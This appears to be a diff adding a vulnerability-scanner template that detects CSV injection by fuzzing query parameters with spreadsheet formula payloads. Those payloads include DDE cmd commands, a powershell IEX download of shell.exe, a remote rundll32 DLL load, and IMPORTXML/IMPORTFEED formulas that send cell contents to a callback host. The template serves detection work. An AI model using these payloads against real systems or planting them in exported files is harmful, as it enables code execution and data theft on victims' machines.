@@ -1,0 +1,50 @@
+id: csv-injection
+
+info:
+  name: CSV Injection Detection
+  author: DhiyaneshDK,ritikchaddha
+  severity: medium
+  description: |
+    A CSV injection detection template to identify and prevent CSV injection vulnerabilities by using various payloads that could be interpreted as formulas by spreadsheet applications.
+  tags: dast,csv,oast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      csv_fuzz:
+        - "class.module.classLoader.resources.context.configFile=http://{{interactsh-url}}"
+        - 'DDE ("cmd";"/C nslookup{{interactsh-url}}";"!A0")A0'
+        - "@SUM(1+9)*cmd|' /C nslookup{{interactsh-url}}'!A0"
+        - "=10+20+cmd|' /C nslookup{{interactsh-url}}'!A0"
+        - "=cmd|' /C nslookup{{interactsh-url}}'!'A1'"
+        - "=cmd|'/C powershell IEX(wget{{interactsh-url}}/shell.exe)'!A0"
+        - "=cmd|'/c rundll32.exe \\{{interactsh-url}}\3\2\1.dll,0'!_xlbgnm.A1"
+        - '=IMPORTXML(CONCAT("http://{{interactsh-url}}", CONCATENATE(A2:E2)), "//a/a10")'
+        - '=IMPORTFEED(CONCAT("http://{{interactsh-url}}/123.txt?v=", CONCATENATE(A2:E2)))'
+        - '=IMPORTHTML (CONCAT("http://{{interactsh-url}}/123.txt?v=", CONCATENATE(A2:E2)),"table",1)'
+        - '=IMAGE("https://{{interactsh-url}}/images/srpr/logo3w.png")'     
+
+    fuzzing:
+      - part: query
+        type: replace # replaces existing parameter value with fuzz payload
+        mode: multiple # replaces all parameters value with fuzz payload
+        fuzz:
+          - '{{csv_fuzz}}'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the HTTP Interaction
+        words:
+          - "http"
+
+      - type: word
+        part: header
+        words:
+          - "text/csv"
+          - "application/csv"
+          - "application/vnd.ms-excel"
